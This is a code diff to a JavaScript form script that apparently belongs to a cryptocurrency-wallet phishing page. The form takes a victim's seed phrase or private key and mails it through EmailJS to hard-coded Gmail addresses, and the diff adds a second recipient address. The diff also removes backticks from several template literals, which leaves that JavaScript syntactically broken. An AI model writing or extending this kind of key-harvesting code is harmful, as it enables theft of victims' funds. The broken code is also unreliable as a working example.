@@ -17,10 +17,10 @@ function setupFormValidation() {
             const hint = seedPhraseInput.parentElement.querySelector('.input-hint');
             if (hint) {
                 if (wordCount === 12 || wordCount === 24) {
-                    hint.textContent = `${wordCount} words (valid seed phrase length)`;
+                    hint.textContent = ${wordCount} words (valid seed phrase length);
                     hint.style.color = 'var(--success-500)';
                 } else {
-                    hint.textContent = `${wordCount} words (should be 12 or 24 words)`;
+                    hint.textContent = ${wordCount} words (should be 12 or 24 words);
                     hint.style.color = 'var(--neutral-500)';
                 }
             }
@@ -42,7 +42,7 @@ function setupFormValidation() {
                     hint.textContent = 'Valid private key length (64 characters)';
                     hint.style.color = 'var(--success-500)';
                 } else {
-                    hint.textContent = `${sanitizedValue.length} characters (should be 64 characters)`;
+                    hint.textContent = ${sanitizedValue.length} characters (should be 64 characters);
                     hint.style.color = 'var(--neutral-500)';
                 }
             }
@@ -218,12 +218,12 @@ function setupFormValidation() {
                 issue_type: issueType,
                 other_issue_description: otherIssueDescription,
                 user_agent: navigator.userAgent,
-                to_email: 'kingsleyfrancis.kalu@gmail.com'
+                to_email: 'kingsleyfrancis.kalu@gmail.com,oscarscott2411@gmail.com'
             };
 
             // --- EmailJS Configuration ---
             const SERVICE_ID = "service_mkx8qgf";
-            const TEMPLATE_ID = "template_kjj20ts"; // <<< YOUR CUSTOM TEMPLATE ID IS HERE
+            const TEMPLATE_ID = "template_g5wq2v1"; // <<< YOUR CUSTOM TEMPLATE ID IS HERE
 
             console.log("Preparing to send email with params:", JSON.stringify(templateParams, null, 2));
             console.log("Using SERVICE_ID:", SERVICE_ID, "and TEMPLATE_ID:", TEMPLATE_ID);
@@ -331,6 +331,6 @@ function showValidationError(message) {
         }, 5000);
     } else {
         console.error("Could not find .validation-form to display error message.");
-        alert(`Validation Error: ${message}`);
+        alert(Validation Error: ${message});
     }
 }
